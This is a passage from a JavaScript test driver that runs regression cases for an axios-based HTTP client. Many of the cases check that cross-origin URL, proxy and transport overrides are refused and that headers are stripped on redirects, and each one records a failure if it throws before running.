    }
  }
  try {
    await otherPlaceholderStillRequiredCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'n1-golden-path-other-placeholder-still-required')) {
      results.push({
        id: 'n1-golden-path-other-placeholder-still-required',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- HIGH: raw-path dispatch must not drop the registered route's config ---
  try {
    await collectionFormPreservesHeadersCase(mdpCjs, '/hdr-items');
  } catch (err) {
    for (const id of [
      'high-collection-form-create-preserves-route-headers',
      'high-collection-form-fetch-preserves-route-headers',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- ResolvedRequest REDESIGN — headline acceptance tests ---
  try {
    await concurrentCreatesProduceTwoPostsCase(mdpEsm, '/rr-concurrent-things');
  } catch (err) {
    if (!results.some((r) => r.id === 'rr-concurrent-creates-produce-two-posts')) {
      results.push({
        id: 'rr-concurrent-creates-produce-two-posts',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await concurrentRefetchAndCreateBothReachWireCase(mdpCjs, '/rr-concurrent-things2');
  } catch (err) {
    if (!results.some((r) => r.id === 'rr-concurrent-refetch-and-create-both-reach-wire')) {
      results.push({
        id: 'rr-concurrent-refetch-and-create-both-reach-wire',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await untrimmedMethodHandBuiltDispatchesCase(mdpEsm, '/rr-untrimmed-method');
  } catch (err) {
    if (!results.some((r) => r.id === 'rr-untrimmed-method-handbuilt-dispatches')) {
      results.push({
        id: 'rr-untrimmed-method-handbuilt-dispatches',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await p11RepeatedTerminalPlaceholderRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'rr-p11-repeated-terminal-placeholder-refuses')) {
      results.push({
        id: 'rr-p11-repeated-terminal-placeholder-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await p11CreateUnresolvableCollectionRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'rr-p11-create-unresolvable-collection-refuses')) {
      results.push({
        id: 'rr-p11-create-unresolvable-collection-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- SECURITY item 2 + items 3/4/5/6 (fix-2.2.0-blockers, adversarial re-probe) ---
  try {
    await securityUrlOverrideCrossOriginRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-urloverride-cross-origin-refuses-no-header-leak')) {
      results.push({
        id: 'sec-urloverride-cross-origin-refuses-no-header-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityUrlOverridePathOnlyStillResolvesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-urloverride-path-only-still-resolves')) {
      results.push({
        id: 'sec-urloverride-path-only-still-resolves',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  // --- SECURITY item 2 ROUND 2 (fix-2.2.0-blockers, adversarial re-probe):
  // three more live-wire exfiltration channels through the SAME per-call
  // `options` bag (raw `url`, `baseURL`, axios's own `proxy`), the "next
  // round" transport-hijack family (`adapter`/`transformRequest`/
  // `httpAgent`), the dedup/cache-key collapse the raw-`url` channel caused,
  // and a positive control proving the fix is an allowlist, not an
  // over-broad denylist. ---
  try {
    await securityRawUrlOptionCrossOriginRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-options-url-cross-origin-refuses-no-header-leak')) {
      results.push({
        id: 'sec-options-url-cross-origin-refuses-no-header-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityBaseUrlOptionCrossOriginRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-options-baseurl-cross-origin-refuses-no-header-leak')) {
      results.push({
        id: 'sec-options-baseurl-cross-origin-refuses-no-header-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityProxyOptionCrossOriginRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-options-proxy-cross-origin-refuses-no-header-leak')) {
      results.push({
        id: 'sec-options-proxy-cross-origin-refuses-no-header-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityTransportHijackFamilyRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-options-transport-hijack-family-refuses')) {
      results.push({
        id: 'sec-options-transport-hijack-family-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityConcurrentDistinctUrlOverridesBothRefuseCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-dedup-concurrent-distinct-url-overrides-both-refuse-no-collapse')) {
      results.push({
        id: 'sec-dedup-concurrent-distinct-url-overrides-both-refuse-no-collapse',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityAllowlistedOptionsStillForwardCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-options-allowlisted-keys-still-forward-positive-control')) {
      results.push({
        id: 'sec-options-allowlisted-keys-still-forward-positive-control',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityCrossOriginRedirectStripsRouteHeaderCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-cross-origin-redirect-strips-route-header')) {
      results.push({
        id: 'sec-cross-origin-redirect-strips-route-header',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- fix-percall-header-redirect-leak (defect 1 + risk-list items) ---
  try {
    await securityPerCallHeaderCrossOriginRedirectStripsCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-percall-header-cross-origin-redirect-strips')) {
      results.push({
        id: 'sec-percall-header-cross-origin-redirect-strips',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityRequestRawPerCallHeaderCrossOriginRedirectStripsCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-percall-header-cross-origin-redirect-strips')) {
      results.push({
        id: 'sec-requestraw-percall-header-cross-origin-redirect-strips',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityPluginInjectedHeaderCrossOriginRedirectStripsCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-plugin-injected-header-cross-origin-redirect-strips')) {
      results.push({
        id: 'sec-plugin-injected-header-cross-origin-redirect-strips',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securitySameOriginRedirectKeepsHeaderCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-same-origin-redirect-keeps-header-positive-control')) {
      results.push({
        id: 'sec-same-origin-redirect-keeps-header-positive-control',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await security307CrossOriginPostBodySurvivesHeaderStripCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-307-cross-origin-post-body-survives-header-strip')) {
      results.push({
        id: 'sec-307-cross-origin-post-body-survives-header-strip',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- fix-2.2.0-blockers, THE FOURTH EXFILTRATION CHANNEL (item 1) —
  // requestRaw's raw `...otherOptions` spread, and item 2 — dedup-key
  // divergence (params/headers), genuinely exercised (not just refused). ---
  try {
    await securityRequestRawUrlChannelRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-options-url-cross-origin-refuses-no-token-leak')) {
      results.push({
        id: 'sec-requestraw-options-url-cross-origin-refuses-no-token-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityRequestRawBaseUrlChannelRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-options-baseurl-cross-origin-refuses-no-token-leak')) {
      results.push({
        id: 'sec-requestraw-options-baseurl-cross-origin-refuses-no-token-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityRequestRawProxyChannelRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-options-proxy-cross-origin-refuses-no-token-leak')) {
      results.push({
        id: 'sec-requestraw-options-proxy-cross-origin-refuses-no-token-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityRequestRawTransportHijackFamilyRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-options-transport-hijack-family-refuses')) {
      results.push({
        id: 'sec-requestraw-options-transport-hijack-family-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityRequestRawAbsoluteUrlBaseUrlChannelRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-requestraw-absolute-url-entry-baseurl-refuses-no-token-leak')) {
      results.push({
        id: 'sec-requestraw-absolute-url-entry-baseurl-refuses-no-token-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityUseMinderAxiosConfigUrlChannelRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-usemander-axiosconfig-url-cross-origin-refuses')) {
      results.push({
        id: 'sec-usemander-axiosconfig-url-cross-origin-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityDedupParamsDivergenceNoCollapseCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-dedup-params-divergence-no-cross-tenant-collapse')) {
      results.push({
        id: 'sec-dedup-params-divergence-no-cross-tenant-collapse',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityDedupHeadersDivergenceNoCollapseCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-dedup-headers-divergence-no-cross-tenant-collapse')) {
      results.push({
        id: 'sec-dedup-headers-divergence-no-cross-tenant-collapse',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- BLOCKER 1 + SHOULD-FIX 3 (fix-2.2.0-blockers, post-release adversarial re-probe) ---
  try {
    await minderBaseUrlRegisteredRouteRefusesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-minder-baseurl-registered-route-refuses-no-leak')) {
      results.push({
        id: 'sec-minder-baseurl-registered-route-refuses-no-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await typedMinderBaseUrlRegisteredRouteRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-typedminder-baseurl-registered-route-refuses-no-leak')) {
      results.push({
        id: 'sec-typedminder-baseurl-registered-route-refuses-no-leak',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await securityDedupParamsSerializerDivergenceNoCollapseCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'sec-dedup-paramsserializer-divergence-no-collapse')) {
      results.push({
        id: 'sec-dedup-paramsserializer-divergence-no-collapse',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  try {
    await optionParamsPathSubstitutionCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'item3-options-params-only-resolves-path-no-redundant-query')) {
      results.push({
        id: 'item3-options-params-only-resolves-path-no-redundant-query',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await unresolvedPlaceholderRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'item3-unresolved-placeholder-refuses')) {
      results.push({
        id: 'item3-unresolved-placeholder-refuses',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await junkMethodOverrideFallsBackCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'item4-junk-method-override-falls-back-to-declared-method')) {
      results.push({
        id: 'item4-junk-method-override-falls-back-to-declared-method',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await interiorInvalidMethodRefusesCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'item5-interior-invalid-method-refuses-directed-error')) {
      results.push({
        id: 'item5-interior-invalid-method-refuses-directed-error',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await repeatedPlaceholderValidatesCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'item6-computeroutevalidation-repeated-placeholder-both-substituted-valid')) {
      results.push({
        id: 'item6-computeroutevalidation-repeated-placeholder-both-substituted-valid',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  await recorder.close();
  return results;
}
